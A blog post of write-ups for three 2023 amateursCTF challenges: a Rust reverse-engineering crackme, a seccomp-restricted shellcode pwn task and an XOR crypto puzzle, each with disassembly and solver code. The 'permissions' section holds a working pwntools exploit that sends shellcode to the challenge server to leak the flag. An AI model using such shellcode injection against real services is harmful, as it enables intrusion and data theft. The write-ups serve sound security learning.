---
layout: post
title: 2023 amateursCTF Write-ups
---

# rusteze

This was a super interesting reverse engineering challenge that revolves around two crucial bit manipulation operations.

Checking the file type, we see that it is a 64-bit, dynamically linked, and not stripped.
```
└─$ file rusteze 
rusteze: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=846fc9cadd5b3c532f2d0a9e43783771818b8e15, for GNU/Linux 3.2.0, with debug_info, not stripped
```

Running the program, we are prompted for an input and then told if we are right or wrong.
```
└─$ ./rusteze       
> asdf
Wrong!
```

## Reversing

Looking at the binary in Binary Ninja, we notice straight away that this is not written in C, but in Rust. Now, I have very little experience in Rust, so this was not only a great RE learning opportunity, but a great introduction to the Rust language.

Finding main is pretty simple, Binary Ninja takes us write to the ```libc``` wrapper. In ```main```, we find an abomination of a function! The program starts by prompting us and reading in our input.
```
00008ed0      void var_1b8
00008ed0      core::fmt::Arguments::new_const::hd11581033061b1dd(&var_1b8, &data_51fe8, 1)
00008ee1      std::io::stdio::_print::h1de311987873daa6(&var_1b8)
00008eea      std::io::stdio::stdout::h93b29d83bf23c1f8()
00008eec      int64_t* var_188 = &std::io::stdio::STDOUT::h66695466c0ffcaed
00008f0f      core::result::Result$LT$T$C$E$GT$::unwrap::h3fd4ea15f7b7544a(_$LT$std..io..stdio..Std.....Write$GT$::flush::hab35191a8fbb2e85(&var_188))
00008f1c      void var_180
00008f1c      alloc::string::String::new::h0a488b57dd6b75ab(&var_180)
00008f28      std::io::stdio::stdin::h9509e241094110e5()
00008f5e      void* var_158 = &std::io::stdio::stdin::INSTANCE::h1e2e211e8d361242
00008f85      void var_168
00008f85      std::io::stdio::Stdin::read_line::h662566dfd77036f8(&var_168, &var_158, &var_180)
00008f98      core::result::Result$LT$T$C$E$GT$::unwrap::h544f5fdc9beeda1b(&var_168)
00008fa7      int64_t rax_1
00008fa7      int64_t rdx_1
00008fa7      rax_1, rdx_1 = _$LT$alloc..string..Stri.....Deref$GT$::deref::h301e4090f485e7a9(&var_180)
00008fc2      char* rax_2
00008fc2      int64_t rdx_2
00008fc2      rax_2, rdx_2 = core::str::_$LT$impl$u20$str$GT$::trim::hfcfb1f36944c5096(rax_1, rdx_1)
```

The first thing we need to do is ensure that our input is ```0x26``` bytes long.
```
if (rdx_2 == 0x26)
```

In this case, ```rdx_2``` is our input length.

Next, using the disassembly, we see that an array is initialized with a bunch of random values. Note for the sake of brevity, I am only showing 5 lines, but the array is 38 elements long.
```
00009011  c684241c01000027   mov     byte [rsp+0x11c {var_11c}], 0x27
00009019  c684241d01000097   mov     byte [rsp+0x11d {var_11b_1}], 0x97
00009021  c684241e01000057   mov     byte [rsp+0x11e {var_11a_1}], 0x57
00009029  c684241f010000e1   mov     byte [rsp+0x11f {var_119_1}], 0xe1
00009031  c6842420010000a9   mov     byte [rsp+0x120 {var_118_1}], 0xa9
00009039  c684242101000075   mov     byte [rsp+0x121 {var_117_1}], 0x75
00009041  c684242201000066   mov     byte [rsp+0x122 {var_116_1}], 0x66
```

Now we see the fun start to begin! Another array is allocated initialized to ```null``` and we can start picking apart the interworkings of this function.
```
00009150          void var_f6
00009150          memset(&var_f6, 0, 0x26)
```

It looks like a ```for``` loop is used to loop through the characters of our input and is ```xor```d with the elements of the same index in the array discussed earlier and finally rotated left by 2 bits.
```
000091ae          for (int64_t counter = 0; counter u< 0x26; counter = counter + 1)
0000930a              int64_t rax_5
0000930a              rax_5.b = counter u< rdx_2
0000930f              if ((rax_5.b & 1) == 0)
00009356                  core::panicking::panic_bounds_check::h937aba65fb5d17a6(counter, rdx_2)
00009356                  noreturn
0000931d              char* rax_6
0000931d              rax_6.b = input[counter]
00009335              int64_t rax_7
00009335              rax_7.b = counter u< 0x26
0000933a              if ((rax_7.b & 1) == 0)
000093bb                  core::panicking::panic_bounds_check::h937aba65fb5d17a6(counter, 0x26)
000093bb                  noreturn
00009361              rax_7.b = rax_6.b
00009365              rax_7.b = rax_7.b ^ (&first_array)[counter]
00009373              rax_7.b = rax_7.b
0000937a              char var_19_1 = rax_7.b
00009381              int32_t var_18_1 = 2
0000938c              rax_7.b = rol.b(rax_7.b, 2)
00009396              rax_7.b = rax_7.b
000093bf              rax_7.b = rax_7.b
000093ca              rax_7.b = rax_7.b
000093e6              int64_t rax_8
000093e6              rax_8.b = counter u< 0x26
```

And finally our input is copied into the empty array which I assumed is our result.
```
000093f4              rcx_4.b = rax_7.b
000093f8              *(&var_f6 + counter) = rcx_4.b
```

### Part 2

For this part, we have a similar function being used as the ```for``` loop discussed previously. We have a new 38 element array of values, except this time our encoded input is being compared against the values of this array. If the values match, we win!

## Solution

To solve this solution, we just need to reverse the operations and start with the second array discussed earlier. To start, we declare and initialized two ```char``` arrays with the values we found in the disassembly.
```c
    unsigned char key[] = {0x19, 0xeb, 0xd8, 0x56, 0x33, 0x00, 0x50, 0x35, 0x61, 0xdc, 0x96, 0x6f, 0xb5, 0xd, 0xa4, 0x7a, 0x55, 0xe8, 0xfe, 0x56, 0x97, 0xde, 0x9d, 0xaf, 0xd4, 0x47, 0xaf, 0xc1, 0xc2, 0x6a, 0x5a, 0xac, 0xb1, 0xa2, 0x8a, 0x59, 0x52, 0xe2};

	unsigned char xor[] = {0x27, 0x97, 0x57, 0xe1, 0xa9, 0x75, 0x66, 0x3e, 0x1b, 0x63, 0xe3, 0xa0, 0x05, 0x73, 0x59, 0xfb, 0x0a, 0x43, 0x8f, 0xe0, 0xba, 0xc0, 0x54, 0x99, 0x06, 0xbf, 0x9f, 0x2f, 0xc4, 0xaa, 0xa6, 0x74, 0x1e, 0xdd, 0x97, 0x22, 0xed, 0xc5};
```

Now we need a rotate right function since there isnt a built in function for this in C.
```c
unsigned char rotate_right(unsigned char c) {
	
	int rotate = 2;
	int bits = 8;

	char shifted = c >> rotate;
	char rot_bits = c << (bits - rotate);

	return shifted | rot_bits;
}
```

Finally, we need two ```for``` loops that will reverse the operations in the original binary.
```c
	for (int i = 0; i < 38; i++) {
		key[i] = rotate_right(key[i]);
	}

	for (int i = 0; i < 38; i++) {
		key[i] = key[i] ^ xor[i];
		printf("%c", key[i]);
	}
```

The whole shebang:
```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

unsigned char rotate_right(unsigned char c) {
	
	int rotate = 2;
	int bits = 8;

	char shifted = c >> rotate;
	char rot_bits = c << (bits - rotate);

	return shifted | rot_bits;
}

int main() {

	unsigned char key[] = {0x19, 0xeb, 0xd8, 0x56, 0x33, 0x00, 0x50, 0x35, 0x61, 0xdc, 0x96, 0x6f, 0xb5, 0xd, 0xa4, 0x7a, 0x55, 0xe8, 0xfe, 0x56, 0x97, 0xde, 0x9d, 0xaf, 0xd4, 0x47, 0xaf, 0xc1, 0xc2, 0x6a, 0x5a, 0xac, 0xb1, 0xa2, 0x8a, 0x59, 0x52, 0xe2};

	unsigned char xor[] = {0x27, 0x97, 0x57, 0xe1, 0xa9, 0x75, 0x66, 0x3e, 0x1b, 0x63, 0xe3, 0xa0, 0x05, 0x73, 0x59, 0xfb, 0x0a, 0x43, 0x8f, 0xe0, 0xba, 0xc0, 0x54, 0x99, 0x06, 0xbf, 0x9f, 0x2f, 0xc4, 0xaa, 0xa6, 0x74, 0x1e, 0xdd, 0x97, 0x22, 0xed, 0xc5};

	for (int i = 0; i < 38; i++) {
		key[i] = rotate_right(key[i]);
	}

	for (int i = 0; i < 38; i++) {
		key[i] = key[i] ^ xor[i];
		printf("%c", key[i]);
	}

	return 0;
}
```

# permissions

This was a pwn challenge that taught me a lot about seccomp. 

Checking the file type:
```
chal: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=0b01e643dad484f0457799f25ccf1e5651be089e, for GNU/Linux 3.2.0, not stripped
```

Check the file protections:
```
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
Full RELRO      No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   50 Symbols	  No	02		chal
```

No canary means overflows are easier. No PIE means they are harder again!

Running the binary we are prompted for input and we see what looks like a segfault, but we are told we have invoked an illegal hardware instruction.
```
> asdf
zsh: illegal hardware instruction  ./chal
```

## Reversing

The main function is pretty straightforward. The flag file is opened and read into a buffer. Then out input is read into a buffer, and finally our input is called as a function with the flag as an arugment.
```
00001387  int32_t main(int32_t argc, char** argv, char** envp) __noreturn

000013a2      setbuf(fp: stdout, buf: nullptr)
000013b6      setbuf(fp: stderr, buf: nullptr)
000013c0      alarm(6)
000013d9      int32_t rax_1 = open(file: "flag.txt", oflag: 0)
000013e5      if (rax_1 s< 0)
000013fb          errx(eval: 1, fmt: "failed to open flag.txt")
000013fb          noreturn
00001420      int64_t flag = mmap(addr: nullptr, len: 0x1000, prot: 2, flags: 0x22, fd: 0xffffffff, offset: 0)
0000142e      if (flag == -1)
00001444          errx(eval: 1, fmt: "failed to mmap memory")
00001444          noreturn
00001462      if (read(fd: rax_1, buf: flag, nbytes: 0x1000) s< 0)
00001478          errx(eval: 1, fmt: "failed to read flag")
00001478          noreturn
00001495      if (mprotect(flag, 0x1000, 2) s< 0)
000014ab          errx(eval: 1, fmt: "failed to change mmap permission…")
000014ab          noreturn
000014d0      int64_t input = mmap(addr: nullptr, len: 0x100000, prot: 7, flags: 0x22, fd: 0xffffffff, offset: 0)
000014de      if (input == -1)
000014f4          errx(eval: 1, fmt: "failed to mmap shellcode buffer")
000014f4          noreturn
00001508      printf(format: &data_20b0)
00001526      if (read(fd: 0, buf: input, nbytes: 0x100000) s>= 0)
00001546          setup_seccomp()
00001556          input(flag)
0000155d          exit(status: 0)
0000155d          noreturn
0000153c      errx(eval: 1, fmt: "failed to read shellcode")
0000153c      noreturn
```

At first, I said "Great! An easy shellcode challenge!", but not so fast. Now I see why we had an illegal hardware instruction. Seccomps are enabled and set in this binary meaning we can only use specifically defined assembly instructions in our shellcode. Now, instead of trying to decipher the ```setup_seccomp()``` function, I opted to just use the ```seccomps-tools``` command line tool to tell me which instructions were allowed.
```
└─$ seccomp-tools dump ./chal
> asdf
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x08 0xc000003e  if (A != ARCH_X86_64) goto 0010
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x05 0xffffffff  if (A != 0xffffffff) goto 0010
 0005: 0x15 0x03 0x00 0x00000000  if (A == read) goto 0009
 0006: 0x15 0x02 0x00 0x00000001  if (A == write) goto 0009
 0007: 0x15 0x01 0x00 0x0000003c  if (A == exit) goto 0009
 0008: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0010
 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0010: 0x06 0x00 0x00 0x00000000  return KILL
```

So we can only use ```read```, ```write```, and ```exit``` in our shellcode. Nothing to fear! Thats all we need!

## Pwn

Thankfully, ```pwntools``` has a DOPE shellcode generation extension that makes this pretty trivial to do. We just need to call ```write``` with the file pointer set to ```stdout```, with ```rdi``` as the buffeto write to the screen, and length to read.
```python
#!/usr/bin/env python3

from pwn import *

e = context.binary = ELF('./chal')

r = remote('amt.rs', 31174)
#r = e.process()
#r = gdb.debug('./chal', '''
#              break main
#              continue
#              ''')

print(r.recvuntil(b'> '))

shellcode = asm(shellcraft.write(1, 'rdi', 50))

r.sendline(shellcode)

r.interactive()
```

Et Voila!

# compact_xor

For once, I decided to do a crypto challenge! This was a cool challenge that I didn't even really need to reverse anything for. I just took a hint from the name of the challenge and the flag file we are given.
```
└─$ cat fleg      
610c6115651072014317463d73127613732c73036102653a6217742b701c61086e1a651d742b69075f2f6c0d69075f2c690e681c5f673604650364023944
```

The name suggests we have some value that we need to ```xor``` with another value and the two values must be "close". Just using a ```xor``` calculator online and looking for the first couple letters of the flag format ```amateursCTF{```, I found out that the each two character pair is a hex value and that it is ```xor```d with the following hex value to output a letter of the flag.

The solution is very short if done in python.
```python
#!/usr/bin/env python3

with open('fleg', "r") as file:
    string = file.read()

bytes = [string[i:i + 2] for i in range(0, len(string), 2)]
bytes = bytes[:-1]

ans = ""

for i in range(len(bytes)):
    if i == 0:
        ans += chr(int(bytes[i], 16))
    elif i % 2 == 0:
        ans += chr(int(bytes[i], 16))
    else:
        ans += chr(int(bytes[i], 16) ^ int(bytes[i - 1], 16))

print(ans)
```

